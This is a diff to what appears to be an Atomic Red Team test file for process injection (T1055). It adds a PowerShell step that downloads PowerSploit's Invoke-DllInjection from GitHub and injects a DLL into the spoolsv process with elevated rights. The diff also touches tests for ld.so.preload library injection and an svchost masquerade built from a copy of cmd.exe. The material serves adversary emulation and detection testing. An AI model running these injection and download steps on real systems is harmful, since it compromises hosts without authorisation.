@@ -19,7 +19,7 @@ atomic_tests:
       description: PID of input_arguments
       type: Integer
       default: (get-process spoolsv).id
-  
+
   dependency_executor_name: powershell
   dependencies:
     - description: |
@@ -39,8 +39,11 @@ atomic_tests:
 
 - name: Process Injection via PowerSploit
   description: |
-    PowerShell Injection using [PowerSploit Invoke-DLLInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)
+    PowerShell Injection using [PowerSploit Invoke-DLLInjection](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/1cdad586c841b34c4681cd30bf2b7a10151e2d21/CodeExecution/Invoke-DllInjection.ps1)
 
+    Windows defender may block the download of PowerSploit
+
+    Upon execution the test will
   supported_platforms:
     - windows
 
@@ -48,21 +51,39 @@ atomic_tests:
     dll_payload:
       description: DLL to Inject
       type: Path
-      default: T1055.dll
+      default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
     process_id:
       description: PID of input_arguments
       type: Integer
       default: (get-process spoolsv).id
+    invoke_dllinjection_path:
+      description: path to store PowerSploit after downloading
+      type: String
+      default: $env:TEMP\Invoke-DllInjection.ps1
+
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Powersploit must exist on disk at specified location (#{invoke_dllinjection_path}) and the module must be imported
+      prereq_command: |
+        if (Test-Path #{invoke_dllinjection_path}) {exit 0} else {exit 1}
+      get_prereq_command: |
+        Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/1cdad586c841b34c4681cd30bf2b7a10151e2d21/CodeExecution/Invoke-DllInjection.ps1" -OutFile "#{invoke_dllinjection_path}"
+
   executor:
     name: powershell
     elevation_required: true
     command: |
       $mypid = #{process_id}
-      Invoke-DllInjection.ps1 -ProcessID $mypid -Dll #{dll_payload}
+      Import-Module #{invoke_dllinjection_path}
+      Invoke-DllInjection -ProcessID $mypid -Dll #{dll_payload}
+    cleanup_command: |
+      Remove-Item #{invoke_dllinjection_path}
+      Remove-Module Invoke-DLLInjection
 
 - name: Shared Library Injection via /etc/ld.so.preload
   description: |
-    This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package. 
+    This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.
   supported_platforms:
     - linux
   input_arguments:
@@ -117,7 +138,7 @@ atomic_tests:
       .\bin\#{exe_binary}
 
 - name: svchost writing a file to a UNC path
-  description: | 
+  description: |
     svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
     This works by copying cmd.exe to a file, naming it svchost.exe, then copying a file to the localhost\c$ folder.
   supported_platforms:
@@ -132,4 +153,3 @@ atomic_tests:
     cleanup_command: |
       del C:\T1055.txt >nul 2>&1
       del C:\svchost.exe >nul 2>&1
-      
